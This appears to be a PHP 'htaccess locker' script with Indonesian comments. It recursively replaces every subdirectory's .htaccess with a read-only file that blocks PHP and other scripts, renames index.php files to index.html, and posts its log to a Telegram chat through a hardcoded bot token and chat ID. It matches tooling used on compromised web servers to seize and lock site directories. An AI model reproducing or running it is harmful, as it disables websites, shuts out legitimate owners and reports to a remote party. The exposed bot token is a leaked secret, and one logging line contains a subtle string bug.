<?php

// Pastikan argumen direktori diberikan
if ($argc !== 2) {
    echo "Usage: php script.php /path/to/directory\n";
    exit(1);
}

$targetDir = $argv[1];
$documentRoot = $_SERVER["DOCUMENT_ROOT"];
$logFile = dirname(__FILE__) . "/logfile.log";
$telegramToken = "6849508672:AAHqCtNI4lsew9D-MqWsETULhzmwwTPn39A";
$chatId = "-1002137132938";

// Fungsi untuk mengirim file log ke Telegram
function sendTelegramLogfile($logFile, $chatId, $telegramToken) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$telegramToken/sendDocument");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => $chatId,
        'document' => new CURLFile(realpath($logFile)),
        'caption' => 'Log File',
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// Fungsi untuk memodifikasi atau menambahkan .htaccess
function updateHtaccess($dir, $documentRoot) {
    global $logFile;
    $htaccessFile = $dir . "/.htaccess";

    if ($dir === $documentRoot) {
        // Jangan eksekusi jika di root
        return;
    }

    // Backup dan hapus .htaccess yang ada
    if (file_exists($htaccessFile)) {
        copy($htaccessFile, $htaccessFile . ".bak");
        unlink($htaccessFile);
    }

    // Mencoba membuat file .htaccess baru dan menulis isi ke dalamnya
    $content = <<<EOT
<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.a*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.S*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.s*>
    Order Deny,Allow
    Deny from all
</Files>

<FilesMatch "\.(jpg|pdf)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>

<FilesMatch "^(index.html)$">
 Order allow,deny
 Allow from all
</FilesMatch>

DirectoryIndex index.html

Options -Indexes
ErrorDocument 403 "Error?!: G"
ErrorDocument 404 "Error?!: G"
EOT;

    if (file_put_contents($htaccessFile, $content) === false) {
        $msg = date("Y-m-d H:i:s") . " - Failed to create or write to .htaccess in $dir\n";
        file_put_contents($logFile, $msg, FILE_APPEND);
        return;
    }

    // Mencoba mengatur izin file dengan chmod
    if (!chmod($htaccessFile, 0444)) {
        $msg = date("Y-m-d H:i:s") . " - Failed to set permissions for .htaccess in $dir\n";
        file_put_contents($logFile, $msg, FILE_APPEND);
    }
}

// Fungsi untuk merename index.php ke index.html
function renameIndex($dir, $documentRoot) {
    global $logFile;
    $indexPath = $dir . "/index.php";
    $indexPathHtml = $dir . "/index.html";

    if ($dir === $documentRoot) {
        // Jangan ganti nama jika di root
        return;
    }

    if (file_exists($indexPath)) {
        if (!rename($indexPath, $indexPathHtml)) {
            $msg = date("Y-m-d H:i:s") - "Failed to rename index.php to index.html in $dir\n";
            file_put_contents($logFile, $msg, FILE_APPEND);
        }
    }
}

// Jalankan fungsi pada setiap direktori di dalam direktori target
$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($targetDir));

foreach ($iterator as $file) {
    if ($file->isDir()) {
        updateHtaccess($file->getPathname(), $documentRoot);
        renameIndex($file->getPathname(), $documentRoot);
    }
}

// Kirim file log jika ada isinya
if (filesize($logFile) > 0) {
    sendTelegramLogfile($logFile, $chatId, $telegramToken);
}

// Hapus file log
unlink($logFile);
